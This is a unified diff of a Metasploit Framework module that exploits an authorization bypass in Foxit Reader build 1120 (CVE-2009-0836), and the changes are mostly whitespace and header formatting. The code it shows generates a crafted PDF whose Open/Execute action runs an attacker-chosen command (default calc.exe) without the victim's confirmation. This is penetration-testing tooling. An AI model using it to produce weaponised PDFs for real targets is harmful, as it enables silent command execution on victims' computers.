@@ -1,9 +1,13 @@
-###
-## This file is part of the Metasploit Framework and may be subject to
-## redistribution and commercial restrictions. Please see the Metasploit
-## Framework web site for more information on licensing and terms of use.
-## http://metasploit.com/framework/
-###
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
 
 require 'msf/core'
 require 'zlib'
@@ -17,14 +21,14 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'           => 'Foxit Reader Authorization Bypass',
 			'Description'    => %q{
 					This module exploits a authorization bypass vulnerability in Foxit Reader
-					build 1120. When a attacker creates a specially crafted pdf file containing
-					a Open/Execute action, arbitrary commands can be executed without confirmation
-					from the victim.
+				build 1120. When a attacker creates a specially crafted pdf file containing
+				a Open/Execute action, arbitrary commands can be executed without confirmation
+				from the victim.
 			},
 			'License'        => MSF_LICENSE,
-			'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ], 
+			'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],
 			'Version'        => '$Revision$',
-			'References'     => 
+			'References'     =>
 				[
 					[ 'CVE', '2009-0836' ],
 					[ 'BID', '34035' ],
@@ -32,12 +36,12 @@ class Metasploit3 < Msf::Auxiliary
 			'DisclosureDate' => 'Mar 9 2009',
 			'DefaultTarget'  => 0))
 
-                        register_options(
-                                [
-					OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
-                                        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf']),
-                                        OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
-                                ], self.class)
+		register_options(
+			[
+				OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
+				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf']),
+				OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
+			], self.class)
 
 	end
 
@@ -47,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
 		# Create the pdf
 		pdf = make_pdf(exec)
 
-		print_status("Creating '#{datastore['FILENAME']}' file...") 
+		print_status("Creating '#{datastore['FILENAME']}' file...")
 
 		file_create(pdf)
 	end
@@ -72,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		result
 	end
-	
+
 	def ioDef(id)
 		"%d 0 obj" % id
 	end
@@ -80,13 +84,13 @@ class Metasploit3 < Msf::Auxiliary
 	def ioRef(id)
 		"%d 0 R" % id
 	end
-	
+
 	def make_pdf(exec)
 
 		xref = []
 		eol = "\x0d\x0a"
 		endobj = "endobj" << eol
-    
+
 		# Randomize PDF version?
 		pdf = "%%PDF-%d.%d" % [1 + rand(2), 1 + rand(5)] << eol
 		pdf << "%" << RandomNonASCIIString(4) << eol
